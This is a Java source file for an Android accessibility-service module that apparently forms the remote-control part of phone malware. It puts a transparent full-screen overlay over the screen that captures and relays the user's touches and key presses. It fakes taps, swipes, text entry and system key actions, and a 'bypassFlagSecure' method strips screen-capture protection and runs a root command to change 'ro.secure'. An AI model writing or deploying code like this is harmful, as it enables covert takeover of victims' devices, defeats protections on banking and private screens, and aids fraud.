package com.fason.app.features.relay;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.lang.reflect.Field;

public class OverlayRelayModule extends AccessibilityService {
    private static final String TAG = "OverlayRelay";

    private Context ctx;
    private WindowManager windowManager;
    private PowerManager powerManager;
    private Handler mainHandler = new Handler(Looper.getMainLooper());

    private View touchBlockerView;
    private boolean isBlocking = false;
    private boolean isRelayRunning = false;

    private OnTouchEventListener touchListener;
    private OnKeyEventListener keyListener;

    public interface OnTouchEventListener {
        void onTouchEvent(String eventData);
    }

    public interface OnKeyEventListener {
        void onKeyEvent(String eventData);
    }

    public OverlayRelayModule() {}

    public void init(Context context) {
        this.ctx = context;
        this.windowManager = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
        this.powerManager = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
    }

    public void setTouchListener(OnTouchEventListener listener) {
        this.touchListener = listener;
    }

    public void setKeyListener(OnKeyEventListener listener) {
        this.keyListener = listener;
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                     AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE |
                     AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        info.notificationTimeout = 0;
        setServiceInfo(info);
    }

    public void taoTouchBlocker() {
        touchBlockerView = new View(ctx) {
            @Override
            public boolean onTouchEvent(MotionEvent event) {
                if (!isBlocking) return false;
                JSONObject touchData = chuyenMotionEventSangJSON(event);
                if (touchListener != null) {
                    touchListener.onTouchEvent(touchData.toString());
                }
                return true;
            }

            @Override
            public boolean onKeyDown(int keyCode, KeyEvent event) {
                if (!isBlocking) return false;
                JSONObject keyData = new JSONObject();
                try {
                    keyData.put("type", "key");
                    keyData.put("action", "down");
                    keyData.put("keyCode", keyCode);
                    keyData.put("timestamp", System.currentTimeMillis());
                } catch (Exception ignored) {}
                if (keyListener != null) keyListener.onKeyEvent(keyData.toString());
                return true;
            }

            @Override
            public boolean onKeyUp(int keyCode, KeyEvent event) {
                if (!isBlocking) return false;
                JSONObject keyData = new JSONObject();
                try {
                    keyData.put("type", "key");
                    keyData.put("action", "up");
                    keyData.put("keyCode", keyCode);
                    keyData.put("timestamp", System.currentTimeMillis());
                } catch (Exception ignored) {}
                if (keyListener != null) keyListener.onKeyEvent(keyData.toString());
                return true;
            }
        };

        touchBlockerView.setBackgroundColor(0x00000000);
        touchBlockerView.setFocusable(true);
        touchBlockerView.setFocusableInTouchMode(true);
        touchBlockerView.requestFocus();
    }

    private JSONObject chuyenMotionEventSangJSON(MotionEvent event) {
        JSONObject json = new JSONObject();
        try {
            json.put("type", "touch");
            json.put("action", event.getActionMasked());
            json.put("x", event.getRawX());
            json.put("y", event.getRawY());
            json.put("pressure", event.getPressure());
            json.put("pointerCount", event.getPointerCount());
            json.put("eventTime", event.getEventTime());
            json.put("timestamp", System.currentTimeMillis());
        } catch (Exception ignored) {}
        return json;
    }

    public void hienThiTouchBlocker() {
        if (touchBlockerView == null) taoTouchBlocker();
        if (touchBlockerView.getParent() != null) return;

        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
            ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            PixelFormat.TRANSLUCENT
        );
        params.gravity = Gravity.TOP | Gravity.LEFT;

        try {
            windowManager.addView(touchBlockerView, params);
            isBlocking = true;
        } catch (Exception e) {
            Log.e(TAG, "Khong the them TouchBlocker: " + e.getMessage());
        }
    }

    public void anTouchBlocker() {
        if (touchBlockerView != null && touchBlockerView.getParent() != null) {
            try {
                windowManager.removeView(touchBlockerView);
            } catch (Exception ignored) {}
            isBlocking = false;
        }
    }

    public boolean isBlocking() {
        return isBlocking;
    }

    public void moPhongChamDon(float x, float y) {
        GestureDescription.Builder builder = new GestureDescription.Builder();
        Path path = new Path();
        path.moveTo(x, y);
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 50));
        dispatchGesture(builder.build(), null, null);
    }

    public void moPhongVuot(float x1, float y1, float x2, float y2, long duration) {
        GestureDescription.Builder builder = new GestureDescription.Builder();
        Path path = new Path();
        path.moveTo(x1, y1);
        path.lineTo(x2, y2);
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, duration));
        dispatchGesture(builder.build(), null, null);
    }

    public void moPhongLongPress(float x, float y, long duration) {
        GestureDescription.Builder builder = new GestureDescription.Builder();
        Path path = new Path();
        path.moveTo(x, y);
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, duration));
        dispatchGesture(builder.build(), null, null);
    }

    public void moPhongNhapText(String text) {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                AccessibilityNodeInfo focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
                if (focused != null) {
                    android.os.Bundle arguments = new android.os.Bundle();
                    arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
                    focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
                    focused.recycle();
                }
                root.recycle();
            }
        } catch (Exception e) {
            Log.e(TAG, "Loi nhap text: " + e.getMessage());
        }
    }

    public void moPhongPhimCung(int keyCode) {
        try {
            if (keyCode == KeyEvent.KEYCODE_BACK) {
                performGlobalAction(GLOBAL_ACTION_BACK);
            } else if (keyCode == KeyEvent.KEYCODE_HOME) {
                performGlobalAction(GLOBAL_ACTION_HOME);
            } else if (keyCode == KeyEvent.KEYCODE_APP_SWITCH) {
                performGlobalAction(GLOBAL_ACTION_RECENTS);
            } else if (keyCode == KeyEvent.KEYCODE_POWER) {
                performGlobalAction(GLOBAL_ACTION_POWER_DIALOG);
            }
        } catch (Exception e) {
            Log.e(TAG, "Loi phim cung: " + e.getMessage());
        }
    }

    public void bypassFlagSecure() {
        try {
            if (touchBlockerView != null && touchBlockerView.getParent() != null) {
                WindowManager.LayoutParams params =
                    (WindowManager.LayoutParams) touchBlockerView.getLayoutParams();
                Field flagsField = params.getClass().getField("flags");
                int currentFlags = flagsField.getInt(params);
                flagsField.setInt(params, currentFlags & ~WindowManager.LayoutParams.FLAG_SECURE);
                windowManager.updateViewLayout(touchBlockerView, params);
            }
            Runtime.getRuntime().exec("su -c setprop ro.secure 0");
        } catch (Exception ignored) {}
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {}

    @Override
    public void onInterrupt() {}
}
